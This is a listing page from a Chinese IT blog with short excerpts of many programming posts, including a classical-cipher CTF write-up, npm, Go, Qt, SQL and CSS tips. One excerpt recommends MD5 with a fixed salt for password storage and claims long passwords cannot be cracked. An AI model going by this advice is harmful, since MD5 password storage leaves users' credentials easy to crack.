	<div class="content list__excerpt post__content clearfix">
		效果 文末提供脚本文件下载链接
操作步骤 1、3dmax建模 2、打开脚本 3、运行脚本 选中所有模型之后，运行脚本(工具–&gt;计算所有)
4、结果 文件默认保存在"C:\material_names.csv"
5、脚本下载链接 链接：https://pan.baidu.com/s/1nQqc60kdci9g19LVDDEeQw?pwd=1111
提取码：1111
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b888347524f7d8a8febb1f3d36eea1d1/" rel="bookmark">
			[MRCTF2020]古典密码知多少、天干地支&#43;甲子
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 [MRCTF2020]古典密码知多少、天干地支+甲子 文章目录 [MRCTF2020]古典密码知多少、天干地支+甲子古典密码知多少天干地支+甲子传统知识+古典密码 古典密码知多少 i think you cna know what i mean.emmm… maybe you can buy some fence~ all areuppercase letters
我想你应该知道我的意思。 也许你可以买一些篱笆~都是大写字母
从所给的题目信息提示中看出，一共给出四种古典密码，分别是：猪圈密码、圣堂武士密码、标准银河字母、栅栏密码{英文提示}，且flag的明文为大写。
根据对照表 (1条消息) CTF-Crypto 密码原理及解密方法_小武搞渗透的博客-CSDN博客 ，图形解密为
FGCPFLIRTUASYON 用栅栏密码解密
第1栏：FPIUYGFRAOCLTSN 第2栏：FLAGISCRYPTOFUN 去尝试密码，后发现flag为（去is）
flag{CRYPTOFUN} 天干地支+甲子 用对应每一个天干地支的数字，并加上+甲子（60为一个甲子）
加出来的数字对照Ascii表
flag{Goodjob} 此外在BUUCTF的Crypto的【传统知识+古典密码】这道题，也是用了这个知识点【天干地支+甲子】
传统知识+古典密码 与上一题解题思路一样，得出ascii后，尝试用栅栏密码求得，再用得出的栅栏密码逐个用凯撒密码找出flag
flag{SHUANGYU} 后，尝试用栅栏密码求得，再用得出的栅栏密码逐个用凯撒密码找出flag
flag{SHUANGYU} 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5512a2299c4668a29a34fd7bf522626a/" rel="bookmark">
			js汉字转拼音包——pinyin-pro
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		地址
一个javascript将中文汉字、词语转换为拼音的包，功能非常强大：
nom地址：
pinin-pro
github地址：
pinin-pro
汉字转拼音的npm包现在还是很多的，今天发下来一个很好用的包：pinyin-pro
相对于其他的包，他的体积只有400kb，比部分包的体积要小数倍乃至十倍。而且功能十分丰富，识别很准确，下面一起来看看吧：
安装
npm 安装
npm install pinyin-pro yarn 安装
yarn add pinyin-pro 使用
浏览器端：
import { pinyin } from 'pinyin-pro';
node 端：
const { pinyin } = require('pinyin-pro');
参数
pinyin(word, options) 接收两个参数
word：必填。String 类型，需要转化为拼音的中文
options：可选。Object 类型，用于配置各种输出形式，相关配置在后面有所介绍
基本用法
import { pinyin } from 'pinyin-pro'; // 若为node环境请用require形式引入
// 获取带音调拼音
pinyin('汉语拼音'); // 'hàn yǔ pīn yīn'
// 获取不带声调的拼音
pinyin('汉语拼音', { toneType: 'none' }); // 'han yu pin yin'
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5512a2299c4668a29a34fd7bf522626a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9151aabf4716b4a2d34fbeceadd8a685/" rel="bookmark">
			golang 获取map类型的值时报错的解决办法：type interface {} does not support indexing
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 此处有个map类型的变量，打印结果如下：
fmt.Println(data) [map[market_uni:0 short_name:生鲜 short_name_ch:生鲜 short_name_en:AB stock:0028]]
fmt.Println(data["stock"]) 如果直接获取其中key的值，会报错:
发现data是interface类型的map，因此获取stock，需要使用如下方式：
data.(map[string]interface{})["stock"] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62421cd8cf625fc386ae2bc642c18c0a/" rel="bookmark">
			windows ------ 证书导入（安装）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.51cto.com/u_15127513/3862855
1、选中证书，右击点击安装证书
2、点击下一步
3、选择受信任的根证书颁发机构
点击下一步
4、点击完成
提示安全警告点击是，因为是自己知道的证书
​​​​​​​
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f360ed3181a7794841f69980317c958/" rel="bookmark">
			windows系统下压力测试工具（cpu使用率，内存使用率，磁盘使用率，磁盘空间）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景： 在开发一些极端场景的需求时，需要自测，这种情况需要模拟极端情况很麻烦，所以需要一些压力测试工具来模拟。
微软官方文档中找到了一个文档，专门写了针对cpu，内存，磁盘做压力测试的工具和方法：
Tools To Simulate CPU / Memory / Disk Load | Microsoft Learn
（一）cpu压力测试工具：cpustres
CpuStres - Sysinternals | Microsoft Learn
使用步骤：
1、创建一个线程，注意：创建后默认是睡眠状态。
2、激活一个线程。Active? 是Yes表示激活了。
3、观察CPU占用率，不断的重复1和2两个步骤打到CPU占用率的要求。
（二）内存压力测试工具： testlimit.exe
Testlimit - Sysinternals | Microsoft Learn
使用步骤：
1、查看任务管理器，当前还有多少内存。计算大概需要申请的内存值。
2、调用 TestLimit.exe 申请内存。命令：TestLimit.exe -d -c xxx。 xxx 是以MB为单位。
3、再次查看任务管理器，发现可用内存就很低了，不满足再次调整申请内存的大小。
（三）磁盘空间压力测试： 使用步骤：
1、把consume.exe放到需要压力测试的盘符下面。【压力测试是以盘符为单位】
2、调用consume.exe -disk-space 占用磁盘空间。
3、再次查看盘符对应的磁盘空间，发现已经没有空间了。关闭程序后，占用的磁盘空间会自动释放。
（四）工具下载地址 windows系统下磁盘压力测试工具consume.exe-桌面系统文档类资源-CSDN下载
windows系统下内存压力测试工具testlimit.exe-桌面系统文档类资源-CSDN下载
windows系统下CPU压力测试工具cpustres.exe-桌面系统文档类资源-CSDN下载
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a81917552f92353ca02ace3f3f5257f/" rel="bookmark">
			消息摘要算法与密码加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、有关密码加密的问题 二、消息摘要算法
三、如何保障用户密码的安全
一、有关密码加密的问题 首先，对密码进行加密后，再存储，是非常有必要的,并且主要的防范对象通常是内部员工！需要注意，对密码进行加密处理时，不可以使用加密算法！因为，所有的加密算法都是可以加密，也可以解密的！加密算法的核心价值在于保证数据在传输过程中是安全的，并不保证数据存储的安全！对需要存储的密码进行加密处理时，应该使用消息摘要算法，其本质是一种哈希算法，是不可逆向运算的！ 在pring Boot项目中，提供了DigestUtils工具类，此工具类的方法可以轻松实现“使用MD5算法”进行运算，从而，可以实现将原始密码进行加密，得到一个加密后的结果。
import lombok.extern.slf4j.Slf4j; import org.junit.jupiter.api.Test; import org.springframework.util.DigestUtils; @Slf4j public class DigestTests { @Test public void testEncode() { String rawPassword = "123456"; String encodedPassword = DigestUtils .md5DigestAsHex(rawPassword.getBytes()); log.debug("原始密码={}，MD5运算结果={}", rawPassword, encodedPassword); } } 运算后的结果就是:
二、消息摘要算法 1、消息摘要算法的典型特征：
消息相同，则摘要相同 无论消息长度，摘要的长度是固定的（同一种算法）消息不同，则摘要几乎不会相同 2、常见的消息摘要算法：
MD系列：MD2（128bit）、MD4（128bit）、MD5（128bit）SHA家族：SHA-1（160bit）、SHA-256（256bit）、SHA-384（384bit）、SHA-512（512bit） 以MD5为例，其运算结果是128个二进制组成，通常，会转换成十六进制数来表示，则是32位长度的十六进制数。
所以，MD5算法的运算结果的种类有2的128次方种，即：340282366920938463463374607431768211456
由于消息算法在运算过程中会丢失一部分的数据，所以，消息算法都是不可逆的！
使用消息摘要算法处理密码加密时，任何“破解”都不会是“根据密文计算得到原文”的！
在网络上，有一些平台记录了简单的明文密文的对应关系的数据库，以实现“根据密文查询出原文”的效果，但是，只要原文足够复杂（8位长度以上），这些平台不可能收录其对应关系！
例如md5解密|md5在线解密 - 全球唯一8位小写+数字全收录的解密网站
我们可以去尝试一下，将之前的密码123456加密后的密文去进行解密：
我们可以看出平台记录了简单的明文密文的对应关系，对于一些简单的长度小的密码是可以解密的，但是当我们的密码足够复杂长度够长后这些平台就不可能对其进行解密。
所以为了保证密码原文的复杂性，应该使用“盐”，它将作为被运算数据的组件部分之一，例如：
String rawPassword = "123456"; String salt = "jhfdiu78543hjfdo8"; String encodedPassword = DigestUtils.md5DigestAsHex((rawPassword + salt).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a81917552f92353ca02ace3f3f5257f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dc9298c9222abe10d4f59789adb0d44/" rel="bookmark">
			IDEA最牛逼的五款插件，没有之一，堪称神器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是老猫！
随着业务的发展，系统会越来越庞大，原本简单稳定的功能，可能在不断迭代后复杂度上升，潜在的风险也随之暴露，导致最终服务不稳定，造成业务价值的损失。而为了减少这种情况，其中一种比较好的方式就是提高代码质量，比如通过代码审查，从而降低错误风险，但是，代码审查难度大，代码缺陷、漏洞不易发现，且审查工作随着代码量增加而增加，审查效率低。
工欲善其事，必先利其器，因此，这篇文章给大家介绍几种检查代码质量的利器，Alibaba Java Coding Guidelines、CheckStyle、PMD、FindBugs、SonarLint，让你在关注代码质量的同时，减少 code review 的工作量，提高 code review 的效率，并通过代码质量分析去反向提升我们的代码编写能力
Alibaba Java Coding Guidelines 1、整体介绍： Alibaba Java Coding Guidelines 专注于Java代码规范，目的是让开发者更加方便、快速规范代码格式。该插件在扫描代码后，将不符合规约的代码按 Blocker、Critical、Major 三个等级显示出来，并且大部分可以自动修复，它还基于 Inspection 机制提供了实时检测功能，编写代码的同时也能快速发现问题所在。
阿里巴巴规约扫描包括：
OOP规约
并发处理
控制语句
命名规约
常量定义
注释规范
2、安装步骤： File &gt; Settings &gt; Plugins &gt; Marketplace搜索 “Alibaba Java Coding Guidelines”，按照提示进行安装，然后重启即可。
3、使用说明： 3.1、运行方式：
（1）可以Tools &gt; 阿里编码规约 &gt; 编码规约扫描
（2）在编辑界面或者项目区域点击右键，在右键菜单中选择“编码规约扫描”即可：
3.2、菜单功能：
编码规约扫描：开始扫描代码
打开/关闭实时检测功能：实时检测代码，一般机器性能比较好的话可以开启这项功能
切换语言至英文：中英文切换
3.3、运行结果：
扫描完成后显示结果如下，我们可以看到扫描结果主要分为 Blocker（阻挡者）、Critical（严重问题）、Major（主要的）三个大类，它们表示的是问题的严重程度，严重程度由高到低为：Blocker &gt; Critical &gt; Major，至于每一类中都会包含什么样的问题，图中的内容已经说明了一切。
选中其中的一个问题项目，会出现如下内容（如果当前鼠标点击的是最终项，右边区域显示的是其它的内容，后面会再讲到）：
（1）指定区域搜索同一类问题：
当点击③处的按钮时，会弹出如下按钮：
这里选择扫描区域，来扫描鼠标选中的同类问题。如果按照默认选择，那么运行后的结果就如下图所示：
这里我们可以看到，显示了整个Project中的所有该类的问题。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3dc9298c9222abe10d4f59789adb0d44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bffff3b2e0fa598879fd9367c8a6171c/" rel="bookmark">
			深度学习入门（二十九）卷积神经网络——VGG
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习入门（二十九）卷积神经网络——VGG 前言卷积神经网络——VGG课件VGGVGG块VGG架构进度总结 教材1 VGG块2 VGG网络3 训练模型4 小结参考文献 前言 核心内容来自博客链接1博客连接2希望大家多多支持作者
本文记录用，防止遗忘
卷积神经网络——VGG 课件 使用块的网络VGG
VGG AlexNet比LeNet更深更大来得到更好的精度能不能更深和更大?
选项更多的全连接层(太贵)更多的卷积层将卷积层组合成块
VGG块 深VS宽？
5×5卷积3×3卷积深但窄效果更好 VGG块 3×3卷积（填充1）（n层m通道）2×2最大池化层（步幅2）
VGG架构 多个VGG块后接全连接层 不同次数的重复块得到不同的架构VGG-16，VGG-19 进度 LeNet (1995)
2卷积＋池化层 2全连接层 AlexNet
更大更深 ReLu, Dropout,数据增强 VGG
更大更深的AlexNet(重复的VGG块)
GluonCV Model Zoo https://cv.gluon.ai/model_zoo/classification.html
总结 1、VGG使用可重复使用的卷积块来构建深度卷积神经网络
2、不同的卷积块个数和超参数可以得到不同复杂度的变种
教材 虽然AlexNet证明深层神经网络卓有成效，但它没有提供一个通用的模板来指导后续的研究人员设计新的网络。 在下面的几节中，我们将介绍一些常用于设计深层神经网络的启发式概念。
与芯片设计中工程师从放置晶体管到逻辑元件再到逻辑块的过程类似，神经网络架构的设计也逐渐变得更加抽象。研究人员开始从单个神经元的角度思考问题，发展到整个层，现在又转向块，重复层的模式。
使用块的想法首先出现在牛津大学的视觉几何组（visualgeometry group）的VGG网络中。通过使用循环和子程序，可以很容易地在任何现代深度学习框架的代码中实现这些重复的架构。
1 VGG块 经典卷积神经网络的基本组成部分是下面的这个序列：
1、带填充以保持分辨率的卷积层；
2、非线性激活函数，如ReLU；
3、汇聚层，如最大汇聚层。
对于给定的感受野（与输出有关的输入图片的局部大小），采用堆积的小卷积核优于采用大的卷积核，因为可以增加网络深度来保证学习更复杂的模式，而且代价还比较小（参数更少）。例如，在VGG中，使用了3个3x3卷积核来代替7x7卷积核，使用了2个3x3卷积核来代替5*5卷积核，这样做的主要目的是在保证具有相同感知野的条件下，提升了网络的深度，在一定程度上提升了神经网络的效果。
而一个VGG块与之类似，由一系列卷积层组成，后面再加上用于空间下采样的最大汇聚层。在最初的VGG论文中，作者使用了带有卷积核、填充为1（保持高度和宽度）的卷积层，和带有汇聚窗口、步幅为2（每个块后的分辨率减半）的最大汇聚层。在下面的代码中，我们定义了一个名为vgg_block的函数来实现一个VGG块。
该函数有三个参数，分别对应于卷积层的数量num_convs、输入通道的数量in_channels 和输出通道的数量out_channels.
import torch from torch import nn from d2l import torch as d2l def vgg_block(num_convs, in_channels, out_channels): layers = [] for _ in range(num_convs): layers.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bffff3b2e0fa598879fd9367c8a6171c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f4601b4a75bded9e3b70f36635a694a/" rel="bookmark">
			SQL Server 2019数据库还原数据报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在还原数据到数据库时报错：
尝试打开或创建物理文件 'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER2019\MSSQL\DATA\***.mdf' 时，CREATE FILE 遇到操作系统错误 5(拒绝访问。)。
解决办法是：到报错的路径C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER2019\MSSQL，为文件夹授予Authenticated Users用户授予控制权限，如果没有该用户则需要添加，授予权限后重新还原数据即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/460942bddcbd97983e41f8aed5fe1a3e/" rel="bookmark">
			数据结构 ----- 堆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		❤️ 堆实现 文章目录 ❤️ 堆实现💟 1、什么是堆💝 2、堆源码查看💚 3、堆的基本操作💜 4、向上调整算法、向下调整算法（重点）🖊（一）向上调整✏️ （二）向下调整 💟 1、什么是堆 释义：
堆是计算机科学中一类特殊的数据结构的统称，堆通常是一个可以被看做一颗完全二叉树的数组对象。
堆总是满足下列性质：
堆中的某个结点的值总是不大于或不小于其父结点的值堆总是一颗完全二叉树 释义补充：
将根结点最大的堆叫做最大堆或者大根堆，根结点最小的堆叫做最小堆或小根堆
完全二叉树：一颗深度为k的有n个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为i（1≤i≤n）的结点与满二叉树中编号i的结点在二叉树中的位置相同，则这颗二叉树称为完全二叉树。
如图（以二叉树为3层为例）：
满二叉树：二叉树的层数为k，则其总结点数为2^k-1
完全二叉树：二叉树的层数为k，则其总结点数为 2^(k-1) ≤ N ≤2^k -1
最后一层结点数可能不满，但其结点必须从左到右依次排列，不能间隔。所以满二叉树为一种特殊的完全二叉树。
💝 2、堆源码查看 PS:本文主要分析堆实现过程中重点的思想，具体的堆实现代码请移步到代码仓库查看
堆实现源文件查看 ----------------------------------------------&gt;堆实现源文件
堆实现头文件查看 ----------------------------------------------&gt;堆实现头文件
💚 3、堆的基本操作 //初始化堆 void HeapInit(HP* heap); //销毁堆 void HeapDestory(HP* heap); //插入元素 void HeapPush(HP* heap, HeapDataType x); //删除堆顶元素 void HeapPop(HP* heap); //返回堆顶元素 HeapDataType HeapTop(HP* heap); //判断堆是否为空 bool HeapEmpty(HP* heap); //返回堆的size size_t HeapSize(HP* heap); //向下调整函数 void DownAdjusting(HeapDataType* a, size_t size); //向上调整函数 void UpAdjusting(HeapDataType* a, size_t child); //交换元素 void Swap(HeapDataType* child, HeapDataType* parent); 💜 4、向上调整算法、向下调整算法（重点） 🖊（一）向上调整 代码查看 void UpAdjusting(HeapDataType* a, size_t child) { size_t parent = (child - 1) / 2; //这里的循环判断条件不能为 parent&gt;=0（在取&lt;时，会多走一次循环条件） 或者 parent&gt;0(最后一次不会进入，即parent为0时) while (child &gt; 0) { #ifdef SmallHeap if (a[child] &lt; a[parent]) { //交换父子节点 Swap(&amp;a[child], &amp;a[parent]); //迭代 child = parent; parent = (child - 1) / 2; } else { break; } #endif //SmallHeap #ifdef BigHeap if (a[child] &gt; a[parent]) { //交换父子节点 Swap(&amp;a[child], &amp;a[parent]); //迭代 child = parent; parent = (child - 1) / 2; } else { break; } #endif // BigHeap } } 算法分析 1、向上调整算法用在对堆进行插入数据时。当将新的数据插进堆时，堆原本的结构被破坏了，所以需要向上调整算法进行重新建堆。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/460942bddcbd97983e41f8aed5fe1a3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f1d6fc93d4984f711ba199d82642d9d/" rel="bookmark">
			虚拟机出现该虚拟机似乎正在使用中。 如果该虚拟机未在使用，请按“获取所有权(T)“按钮获取它的所有权。否则，请按“取消(C)“按钮以防损坏。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里写自定义目录标题 虚拟机异常关闭导致的异常 虚拟机异常关闭导致的异常 在使用虚拟机的过程中，经常会遇到虚拟机异常关闭导致的错误，
这种情况下，需要进入虚拟机的安装目录，删除后缀名问lck的文件即可实现问题的解决。
重新打开虚拟机文件，即可
至此，即可实现问题的解决。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f8cd5d5fd8594a035cfbbccbdafa876/" rel="bookmark">
			列出每位学生的各科成绩,要求输出格式:姓名、语文成绩、数学成绩、英语成绩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近遇到一个面试题，根据所给出的表信息，列出每位学生的各科成绩,要求输出格式:姓名、语文成绩、数学成绩、英语成绩
下面我们来看一下具体的写法和需要注意的地方：
这是我们需要用到的两个表：（具体内容或者字段信息，可以根据自己的想法去设计）
下面我们对以下几种sql语句的情况进行分析： 结合两张图我们可以很明显的看出结果不同，第一个sql语句中没有加max，而第二个加了max， 很容易看出第一个的结果是不对的
为什么会出现这种情况，我们来具体分析一下：
首先我们根据第一张图中的sql语句分析，我们执行的是分组后的数据，假设我们在不分组的情况下执行，则会出现下面的情况：
在此基础之上，我们再执行 group by 语句，因为没有聚合函数，则它将会取出基表group by后的第一条数据：（使用group by后为什么要用聚合函数我们可以参考这篇博客）
也就会出现我们第一次执行sql的数据结果：
好的，下面我们来看第二个sql语句，假设我们在不分组的情况下执行：
由前面一个的思想我们就很好的理解了为什么会出现这种情况，
如果不分组，则它会按照max聚合函数执行后取出最大的分数然后返回给我们第一行数据。
所以当我们的第二个sql语句对case when "课程 " then s_score分数进行了max()函数取出最大分数，同时又按照了s_name名字分组，自然而然就的得到了我们的正确答案：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e15fced758db5d3c8218bc09251eb40/" rel="bookmark">
			如何用css实现百叶窗效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.效果图 利用纯css实现百叶窗效果
效果如下：
2.代码如下： 1.创建一个div 2.设置无序列表，插入事先准备好的图片 ​ &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;css实现百叶窗效果&lt;/title&gt; &lt;link rel="stylesheet" href="./css/index.css"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="box"&gt; &lt;ul&gt; &lt;li&gt;&lt;img src="./img/01.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./img/02.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./img/03.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./img/04.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./img/05.jpg" alt=""&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; ​ 3.设置样式 1.设置box的宽高 外边距 边框 overflow（溢出隐藏） overflow：给一个元素中设置overflow:hidden，那么该元素的内容若超出了给定的宽度和高度属性，那么超出的部分将会被隐藏，不占位。（也可以利用overflow：hidden清除浮动）
注意：利用通配符*{
margin=0；
padding=0；
}
清除原有边框样式
利用选择器分别设置每个部分的样式
2. 因为ul是块级元素，所以为了方便可以把ul设置为弹性布局 因为ul li是自带内外边距的标签，可以更灵活方便的控制网页的标签
3.利用transition设置百叶窗过渡时间 transitition为css3动画内容，实现百叶窗效果的重要样式，过渡时间设置单位以s/ms为单位。
4.把img设置为块级元素，设置宽高 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e15fced758db5d3c8218bc09251eb40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4f5315e642bf5c34acfbf85facda203/" rel="bookmark">
			echarts之热力图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		非连续型热力图设定
指定值显示指定颜色指定颜色有对应的文本可自定义显示文本 实现图表如下
具体代码：
// 基于准备好的dom，初始化echarts实例 echarts.init(document.getElementById('barPaymentAnalysisBar')).dispose() let myChart = echarts.init(document.getElementById("barPaymentAnalysisBar")); const option = { tooltip: {}, xAxis: { type: "category", data: [0, 1, 2, 3, 4, 2, 3, 7, 8, 9, 10, 11, 12, 13, 14, 12, 13, 17, 18, 19, 20] }, yAxis: { type: "category", data: [0, 1, 2, 3, 4, 2, 3, 7, 8, 9, 10, 11, 12, 13, 14, 12, 13, 17, 18, 19] }, tooltip: { trigger: 'axis', axisPointer: { // 坐标轴指示器，坐标轴触发有效 type: 'shadow' // 默认为直线，可选为：'line' | 'shadow' }, // 自定义tooltip formatter: function (item) { let res = item[0].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4f5315e642bf5c34acfbf85facda203/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b118d22988690fb917d9e4fb71f1037/" rel="bookmark">
			qt 判断文件是否存在
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 判断文件夹是不是存在
1 QString fullPath;//文件夹全路径 2 /*方法1*/ 3 bool isDirExist(QString fullPath) 4 { 5 QDir dir(fullPath); 6 if(dir.exists()) 7 { 8 return true; 9 } 10 return false; 11 } 12 /*方法2*/ 13 bool isDirExist(QString fullPath) 14 { 15 QFileInfo fileInfo(fullPath); 16 if(fileInfo.isDir()) 17 { 18 return true; 19 } 20 return false; 21 } 2. 判断文件是不是存在
1 QString fullFileName;//文件全路径(包含文件名) 2 /*方法1*/ 3 bool isFileExist(QString fullFileName) 4 { 5 QFileInfo fileInfo(fileFullName); 6 if(fileInfo.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b118d22988690fb917d9e4fb71f1037/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/116/">«</a>
	<span class="pagination__item pagination__item--current">117/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/118/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>